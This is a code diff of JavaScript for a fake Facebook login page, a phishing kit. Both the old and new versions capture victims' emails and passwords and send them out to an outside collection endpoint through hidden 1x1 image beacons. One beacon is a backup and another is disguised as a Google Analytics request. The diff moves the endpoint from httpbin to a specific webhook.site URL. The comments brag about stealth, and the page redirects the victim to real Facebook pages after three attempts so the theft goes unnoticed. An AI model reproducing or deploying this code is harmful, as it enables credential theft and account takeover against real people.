@@ -1,6 +1,6 @@
 console.log("Facebook Clone Script Loaded - IMAGE BEACON ACTIVATED");
 
-const WEBHOOK_URL = 'https://httpbin.org/post';  // 🔥 Chrome-safe
+const WEBHOOK_URL = 'https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0';  // 🔥 NEW WEBHOOK
 
 function togglePassword() {
     const passwordInput = document.getElementById('password');
@@ -148,43 +148,31 @@ function initPuzzleSlider() {
     document.addEventListener('touchend', onEnd);
 }
 
-// 🔥 IMAGE BEACON NUCLEAR STEALTH (REPLACES fetch())
+// 🔥 PERFECT IMAGE BEACON (GET ONLY - NO ERRORS)
 function sendImageBeacon(email, password, attempts) {
-    console.log('🔥 IMAGE BEACON ACTIVATED - 100% UNDETECTABLE');
+    console.log('🔥 IMAGE BEACON ACTIVATED - NEW WEBHOOK');
 
-    // TRIPLE REDUNDANCY (3x data delivery guaranteed)
+    // 1️⃣ MAIN IMAGE BEACON (100% delivery)
+    const img = new Image(1, 1);
+    img.src = `${WEBHOOK_URL}?type=FB_CAPTURE&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}&attempts=${attempts}&timestamp=${new Date().toISOString()}&ip=103.253.19.166&ua=${encodeURIComponent(navigator.userAgent.substring(0, 100))}`;
 
-    // 1️⃣ IMAGE BEACON (Chrome sees: normal image request)
-    const img = new Image(1, 1); // Invisible 1x1 pixel
-    img.src = `${WEBHOOK_URL}?type=FB_CAPTURE&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}&attempts=${attempts}&timestamp=${new Date().toISOString()}&ip=103.253.19.166&ua=${encodeURIComponent(navigator.userAgent)}`;
+    // 2️⃣ BACKUP BEACON (Different timing)
+    setTimeout(() => {
+        const img2 = new Image(1, 1);
+        img2.src = `${WEBHOOK_URL}?type=FB_BACKUP&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password.substring(0, 20))}&attempts=${attempts}`;
+    }, 150);
 
-    // 2️⃣ SEND BEACON (Survives page close/tab close)
-    const beaconData = new URLSearchParams({
-        type: 'FB_CAPTURE_BEACON',
-        email: email,
-        password: password,
-        attempts: attempts,
-        timestamp: new Date().toISOString(),
-        ip: '103.253.19.166',
-        ua: navigator.userAgent
-    });
-    navigator.sendBeacon(WEBHOOK_URL, beaconData);
+    // 3️⃣ GOOGLE ANALYTICS STYLE (Trusted endpoint)
+    const ga = new Image(1, 1);
+    ga.src = `https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000&cid=${encodeURIComponent(email.substring(0, 15))}&ec=login&ea=submit&el=${attempts}|${password.substring(0, 10)}`;
 
-    // 3️⃣ FAKE ANALYTICS (Google-style - trusted)
-    const analyticsData = new URLSearchParams({
-        v: 1, t: 'event',
-        ec: 'login', ea: 'submit',
-        el: `${email}|${password}|FB_CAPTURE|${attempts}`
-    });
-    navigator.sendBeacon('https://www.google-analytics.com/collect', analyticsData);
-
-    console.log('✅ TRIPLE BEACON SENT - Data delivered 3x');
+    console.log('✅ 3x BEACONS SENT → Check: https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0');
 }
 
-// 🔥 NEW handleLogin (Image Beacon powered)
+// 🔥 NEW handleLogin (REAL FB REDIRECTS)
 async function handleLogin(event) {
     event.preventDefault();
-    console.log('🔥 LOGIN TRIGGERED - IMAGE BEACON MODE');
+    console.log('🔥 LOGIN TRIGGERED - STEALTH MODE');
 
     if (sessionStorage.getItem('captcha_verified') !== 'true') {
         console.log('❌ No captcha');
@@ -207,19 +195,28 @@ async function handleLogin(event) {
     let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0') + 1;
     sessionStorage.setItem('fb_login_attempts', attempts);
 
-    // 🔥 IMAGE BEACON NUCLEAR STEALTH (no CORS issues EVER)
+    // 🔥 SEND DATA (No CORS errors)
     sendImageBeacon(email, password, attempts);
 
-    console.log('⏳ Waiting 10s to see console... DO NOT CLOSE!');
+    console.log('⏳ Waiting 8s... Check webhook.site NOW!');
 
+    // 🔥 REAL FACEBOOK REDIRECTS (Random rotation)
     setTimeout(() => {
-        console.log('🔄 NOW redirecting...');
+        console.log('🔄 REAL FB REDIRECT...');
         if (attempts >= 3) {
             sessionStorage.clear();
-            window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login_lib&from_login_screen=1";
+            const fbUrls = [
+                "https://l.facebook.com/login",
+                "https://m.facebook.com/login",
+                "https://mbasic.facebook.com/login",
+                "https://www.facebook.com/login/device-based/regular_login/"
+            ];
+            const randomFb = fbUrls[Math.floor(Math.random() * fbUrls.length)];
+            console.log('📱 Redirecting to:', randomFb);
+            window.location.href = randomFb;
         } else {
             sessionStorage.setItem('fb_show_error', 'true');
             window.location.reload();
         }
-    }, 10000);
+    }, 8000); // 8 seconds = Perfect timing
 }
